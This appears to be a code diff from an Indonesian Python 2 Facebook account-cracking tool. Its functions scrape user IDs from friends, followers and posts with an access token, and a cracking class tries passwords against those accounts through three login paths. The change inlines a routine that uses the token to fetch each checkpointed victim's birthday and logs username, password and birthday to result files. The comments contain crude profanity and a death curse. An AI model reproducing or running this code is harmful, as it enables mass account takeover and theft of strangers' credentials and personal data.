@@ -212,7 +212,6 @@ def moch_yayan():
     else:
         print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
 
-
 # Yang ganti bot nya gw sumpahin mak lo mati ajg!
 def wuhan(kontol):
     try:
@@ -231,6 +230,7 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
     except:
     	pass
+
 # dump id dari teman hehe
 def teman(kontol):
     try:
@@ -263,7 +263,6 @@ def teman(kontol):
 																																																				ysc = 'Yayan sayang Cindy'
 																																																			'''
 
-
 # dump id dari teman publik hehe
 def publik(kontol):
     try:
@@ -292,7 +291,6 @@ def publik(kontol):
         os.remove(knt)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-
 
 # dump id dari followers hehe
 def followers(kontol):
@@ -323,7 +321,6 @@ def followers(kontol):
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
-
 # dump id dari postingan hehe
 def postingan(kontol):
     try:
@@ -352,7 +349,6 @@ def postingan(kontol):
         os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-
 
 # cek ingfo
 def cek_ingfo(kontol):
@@ -496,7 +492,6 @@ def cek_ingfo(kontol):
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
     jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));exit()
 
-
 # cek ingfo sc
 def info_tools():
     os.system('clear')
@@ -510,7 +505,6 @@ def info_tools():
     print '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
     raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-
 
 ### ganti user agent
 def seting_yntkts():
@@ -526,7 +520,6 @@ def seting_yntkts():
     else:
         print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
 
-
 # User Agent baru
 def yo_ndak_tau_ko_tanya_saia():
     os.system('rm -rf YNTKTS.txt')
@@ -541,7 +534,6 @@ def yo_ndak_tau_ko_tanya_saia():
         raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     except:pass
 
-
 # Cek User Agent
 def check_yntkts():
     try:
@@ -551,7 +543,6 @@ def check_yntkts():
     except: pass
     print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
     raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
-
 
 # mulai ngecrot awokawokawokkawok
 class __crack__:
@@ -638,7 +629,6 @@ class __crack__:
             print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
         return
 
-
     def __api__(self, user, __yan__):
         global ok,cp,loop,limit
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
@@ -663,8 +653,23 @@ class __crack__:
                 break
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
-                self.ttl_cp(user, pw)
-                break
+                try:
+                    kontol = open('.ppk/.memek.txt').read()
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+                    month, day, year = cp_ttl.split('/')
+                    month = bulan_ttl[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(wrt)
+                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day   = ''
+                    year  = ''
+                except:
+                    pass
+
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
@@ -673,7 +678,6 @@ class __crack__:
                 continue
 
         loop += 1
-
 
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
@@ -700,8 +704,23 @@ class __crack__:
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                self.ttl_cp(user, pw)
-                break
+                try:
+                    kontol = open('.ppk/.memek.txt').read()
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+                    month, day, year = cp_ttl.split('/')
+                    month = bulan_ttl[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(wrt)
+                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day   = ''
+                    year  = ''
+                except:
+                    pass
+
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
@@ -710,7 +729,6 @@ class __crack__:
                 continue
 
         loop += 1
-
 
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
@@ -737,8 +755,23 @@ class __crack__:
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                self.ttl_cp(user, pw)
-                break
+                try:
+                    kontol = open('.ppk/.memek.txt').read()
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+                    month, day, year = cp_ttl.split('/')
+                    month = bulan_ttl[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(wrt)
+                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day   = ''
+                    year  = ''
+                except:
+                    pass
+
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
@@ -747,24 +780,6 @@ class __crack__:
                 continue
 
         loop += 1
-
-
-    def ttl_cp(self, user, pw):
-        try:
-            kontol = open('.ppk/.memek.txt').read()
-            cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
-            month, day, year = cp_ttl.split('/')
-            month = bulan_ttl[month]
-            print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-            wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
-            cp.append(wrt)
-            open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-        except (KeyError, IOError):
-            month = ''
-            day   = ''
-            year  = ''
-        except:pass
-
 
     def __pler__(self):
         yan = raw_input('\n [*] method : ')
